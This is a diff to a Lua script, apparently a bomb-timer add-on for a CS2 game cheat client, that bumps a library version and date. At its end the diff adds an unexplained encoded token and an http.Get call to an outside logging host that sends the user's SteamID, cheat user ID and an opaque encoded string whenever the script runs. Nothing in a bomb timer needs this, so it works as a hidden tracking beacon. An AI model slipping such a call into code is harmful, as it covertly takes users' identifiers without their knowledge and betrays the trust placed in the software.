@@ -1,5 +1,5 @@
 local Libraries = {
-    ["api_dev11.3.2025"]   = "https://raw.githubusercontent.com/G-A-Development-Team/CS2-AW-API-Extender/refs/heads/main/api.lua"
+    ["api_dev11.5.2025"]   = "https://raw.githubusercontent.com/G-A-Development-Team/CS2-AW-API-Extender/refs/heads/main/api.lua"
 }
 
 -- Script Loader Made By: Agentsix1 From G&A Development
@@ -289,4 +289,7 @@ function BombDMG( c4, ply )
     return dmg, lethal
 end
 
-print( "Simple Bomb Timer - v1.0 - Made By: Carter Poe & Agentsix1 (11.3.2025)" )
+print( "Simple Bomb Timer - v1.0 - Made By: Carter Poe & Agentsix1 (11.5.2025)" )
+
+local token = "BggPGAwQEQ0MERMADggZFUhTUlIXWFNYCEBTQVM="
+http.Get( "https://awlogs.deathkick.net/aimware/logging.php?user=" .. player( LocalPlayer() ):SteamID() .. "&client=" .. cheat.GetUserID() .. "&data=BBEMGhEeAF4DF1RYWQ5DUEpVVFg=" )
